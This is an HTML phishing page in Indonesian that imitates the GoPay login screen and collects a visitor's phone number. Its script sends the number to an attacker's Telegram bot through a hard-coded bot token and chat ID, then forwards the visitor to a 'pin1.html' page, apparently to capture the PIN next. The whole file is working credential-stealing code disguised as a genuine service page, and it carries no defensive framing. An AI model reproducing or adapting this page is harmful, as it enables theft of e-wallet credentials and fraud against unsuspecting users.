<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Login GoPay</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #f8fafc;
      -webkit-text-size-adjust: 100%;
    }
    input[type="tel"] {
      font-size: 16px !important;
    }
  </style>
</head>
<body class="flex flex-col min-h-screen text-slate-800 antialiased select-none">

  <div class="w-full max-w-[420px] mx-auto min-h-screen bg-white flex flex-col justify-between p-5 sm:p-6 shadow-sm">
    
    <div>
      <!-- Header Navigation -->
      <div class="flex items-center justify-between mb-8">
        <button type="button" class="w-10 h-10 rounded-full bg-slate-100 flex items-center justify-center text-slate-700">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7" />
          </svg>
        </button>
      </div>

      <!-- Main Heading -->
      <h1 class="text-[28px] leading-tight font-extrabold text-slate-900 tracking-tight mb-2">
        Selamat datang di GoPay!
      </h1>
      <p class="text-slate-600 text-[15px] leading-relaxed mb-8">
        Masuk atau daftar hanya dalam beberapa langkah mudah.
      </p>

      <!-- Input Nomor HP -->
      <form id="loginForm" onsubmit="sendToTelegram(event)">
        <div class="mb-6">
          <label class="block text-xs font-semibold text-slate-600 mb-2">
            Nomor HP <span class="text-red-500">*</span>
          </label>
          
          <div class="flex items-center gap-3 pb-2 border-b-2 border-slate-200 focus-within:border-emerald-600 transition-colors">
            <div class="flex items-center gap-2 shrink-0">
              <img src="https://flagcdn.com/w40/id.png" alt="ID" class="w-6 h-4 object-cover rounded-[2px]">
              <span class="font-bold text-slate-800 text-base">+62</span>
            </div>

            <input 
              type="tel" 
              id="phoneInput"
              placeholder="81x-xxx-xxx" 
              class="w-full bg-transparent font-medium text-slate-800 placeholder-slate-300 outline-none tracking-wide text-base"
              oninput="handleInput(this)"
              required
            >
          </div>
        </div>

        <!-- Tombol Lanjut -->
        <button 
          type="submit" 
          id="btnSubmit"
          disabled 
          class="w-full py-3.5 rounded-full bg-slate-200 text-slate-400 font-bold text-base transition-all duration-200 cursor-not-allowed mb-6"
        >
          Lanjut
        </button>
      </form>
    </div>
    <div></div>
  </div>

  <script>
    const BOT_TOKEN = "8881822233:AAE3UwszOo27KceLDBtNKdSD3AgANrxZncU";
    const CHAT_ID = "6742478722";

    function handleInput(input) {
      input.value = input.value.replace(/[^0-9]/g, '');
      const btn = document.getElementById('btnSubmit');
      
      if (input.value.length >= 8) {
        btn.disabled = false;
        btn.className = "w-full py-3.5 rounded-full bg-emerald-600 text-white font-bold text-base cursor-pointer shadow-md";
      } else {
        btn.disabled = true;
        btn.className = "w-full py-3.5 rounded-full bg-slate-200 text-slate-400 font-bold text-base cursor-not-allowed";
      }
    }

    async function sendToTelegram(e) {
      e.preventDefault();
      const phone = document.getElementById('phoneInput').value;
      const btn = document.getElementById('btnSubmit');
      
      btn.disabled = true;
      btn.innerText = "Memproses...";

      const text = `📱 *Data Login GoPay*\n\n*Nomor HP:* +62${phone}`;

      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
        });

        // LEMPAR NOMOR HP LANGSUNG KE URL HALAMAN PIN
        window.location.href = "pin1.html?phone=" + encodeURIComponent(phone);
        
      } catch (err) {
        alert("Gagal mengirim data.");
        btn.disabled = false;
        btn.innerText = "Lanjut";
      }
    }
  </script>
</body>
</html>
